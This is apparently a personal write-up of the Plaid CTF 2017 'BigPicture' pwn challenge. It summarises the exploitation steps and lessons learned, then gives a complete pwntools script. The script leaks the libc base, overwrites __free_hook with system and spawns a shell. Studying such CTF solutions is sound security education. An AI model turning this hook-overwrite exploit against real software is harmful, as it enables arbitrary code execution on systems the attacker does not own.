---
title: "BigPicture | Plaid CTF 2017"
categories: ["pwn"]
tags: []
Points: 200
Solves: 67
---

I wasn't able to solve this challenge during the CTF, but I decided read a writeup and try again! In this post I'll share what I learned.

## Solution summary

I based my exploit on this [bigpicture writeup](https://amritabi0s.wordpress.com/2017/04/24/plaid-ctf-2017-bigpicture-write-up). The write up explains everything in more detail, go read it!

The exploit steps were:
1. Find the `libc offset` in relation to our buffer
2. Find the `libc base` address by leaking some value in the libc data section which contains a pointer to somewhere else in the libc (I used `__memalign_hook`)
3. Overwrite `__free_hook` with a pointer to `system`
4. Write `"/bin/sh\x00"` in the buffer (since the free is going to be called on that buffer)
5. Execute the `quit` command and the `free(buf)` call should instead call `system("/bin/sh")` and spawn a shell


## What I learned for the next CTF
1. If we allocate a large enough chunk, that chunk will not be on the heap section, but instead the malloc will call `mmap` and (at least for this case) the address will be **relative to the LIBC_BASE address**, allowing you to find where the libc is in relation to the chunk allocated.
2. I also learned that you can find the libc base address by looking at some pointers in the libc data section, (I assumed it was possible, but had never tried it before)
3. As I had previously learned the libc hooks (malloc_hook, free_hook..) are a great way to redirect code execution if you find a way to overwrite them

# Exploit
```python
#!/usr/bin/python
from pwn import *

TESTING_LOCAL = True

if TESTING_LOCAL:
    # Libc offsets
    __memalign_hook_OFFSET = 0x398ae0
    __free_hook_OFFSET     = 0x39a788
    SYSTEM_OFFSET          = 0x3f460

    # Ofsets related to the buffer
    LIBC_OFFSET_TO_BUF = -0x497010
    __free_hook_OFFSET_TO_BUF     = LIBC_OFFSET_TO_BUF + __free_hook_OFFSET
    __memalign_hook_OFFSET_TO_BUF = LIBC_OFFSET_TO_BUF + __memalign_hook_OFFSET
    __memalign_hook_content_TO_LIBC_OFFSET = 0x7c240
else:
    pass

def go():
    if TESTING_LOCAL == True:
        p = process("./bigpicture")
    else:
        p = remote("bigpicture.chal.pwning.xxx", 420)

    WIDTH  = 1024
    HEIGHT = 1024
    p.sendlineafter("big? ", "%d x %d" % (WIDTH, HEIGHT))

    def get_val(offset):
        return [offset/HEIGHT, offset%HEIGHT]

    def plot(x, y, c):
        p.sendlineafter(">", " %d , %d , %c " % (x, y, c), )

    def leak_byte(offset):
        val = get_val(offset)
        plot(val[0], val[1], "\x00")
        res = p.recvuntil("\n", timeout = 2)
        if "overwriting" not in res:
            return "\x00"
        else:
            return res.split("overwriting ")[1].split("!")[0]

    def write_byte(offset, c):
        val = get_val(offset)
        plot(val[0], val[1], c)

    # Check if the offset is write, by checking whether we find the string "ELF" at that location
    check_if_we_got_libc = leak_byte(LIBC_OFFSET_TO_BUF+1) + leak_byte(LIBC_OFFSET_TO_BUF+2) + leak_byte(LIBC_OFFSET_TO_BUF+3)
    assert check_if_we_got_libc == "ELF"
    log.success("Found libc base at offset: %s" % hex(LIBC_OFFSET_TO_BUF))

    leaked_memallign_content = leak_byte(__memalign_hook_OFFSET_TO_BUF+0) + leak_byte(__memalign_hook_OFFSET_TO_BUF+1) + \
                               leak_byte(__memalign_hook_OFFSET_TO_BUF+2) + leak_byte(__memalign_hook_OFFSET_TO_BUF+3) + \
                               leak_byte(__memalign_hook_OFFSET_TO_BUF+4) + leak_byte(__memalign_hook_OFFSET_TO_BUF+5)
    leaked_memallign_content = u64(leaked_memallign_content.ljust(8, "\x00"))
    LIBC_BASE = leaked_memallign_content - __memalign_hook_content_TO_LIBC_OFFSET

    # Leak meamallign_hook content so we can locate the LIBC_BASE
    log.info("Found memallign_hook content equals " + hex(leaked_memallign_content))
    assert LIBC_BASE & 0xfff == 0 # Ensure the last 12bits are 0. If not it surely is not the libc base.
    log.success("Found libc base at " + hex(LIBC_BASE))

    SYSTEM_ADDR = LIBC_BASE + SYSTEM_OFFSET
    log.info("SYSTEM at: " + hex(SYSTEM_ADDR))

    # Ovewrite the __free_hook with system and confirm it worked
    SYSTEM_ADDR_packed = p64(SYSTEM_ADDR)
    write_byte(__free_hook_OFFSET_TO_BUF+0, SYSTEM_ADDR_packed[0])
    write_byte(__free_hook_OFFSET_TO_BUF+1, SYSTEM_ADDR_packed[1])
    write_byte(__free_hook_OFFSET_TO_BUF+2, SYSTEM_ADDR_packed[2])
    write_byte(__free_hook_OFFSET_TO_BUF+3, SYSTEM_ADDR_packed[3])
    write_byte(__free_hook_OFFSET_TO_BUF+4, SYSTEM_ADDR_packed[4])
    write_byte(__free_hook_OFFSET_TO_BUF+5, SYSTEM_ADDR_packed[5])
    write_byte(__free_hook_OFFSET_TO_BUF+6, SYSTEM_ADDR_packed[6])
    write_byte(__free_hook_OFFSET_TO_BUF+7, SYSTEM_ADDR_packed[7])

    leaked_free_hook = leak_byte(__free_hook_OFFSET_TO_BUF+0) + leak_byte(__free_hook_OFFSET_TO_BUF+1) + \
                       leak_byte(__free_hook_OFFSET_TO_BUF+2) + leak_byte(__free_hook_OFFSET_TO_BUF+3) + \
                       leak_byte(__free_hook_OFFSET_TO_BUF+4) + leak_byte(__free_hook_OFFSET_TO_BUF+5)
    leaked_free_hook = u64(leaked_free_hook.ljust(8, "\x00"))
    assert leaked_free_hook == SYSTEM_ADDR
    log.success("Successfully written free_hook with system's addr")

    for i, c in enumerate("/bin/sh"):
        write_byte(i, c)

    p.sendline("quit")
    p.clean()
    p.sendline("echo HELLO")
    assert p.recvuntil("HELLO") == "HELLO"
    log.success("We got a shell ;)!")

    p.interactive()

go()
```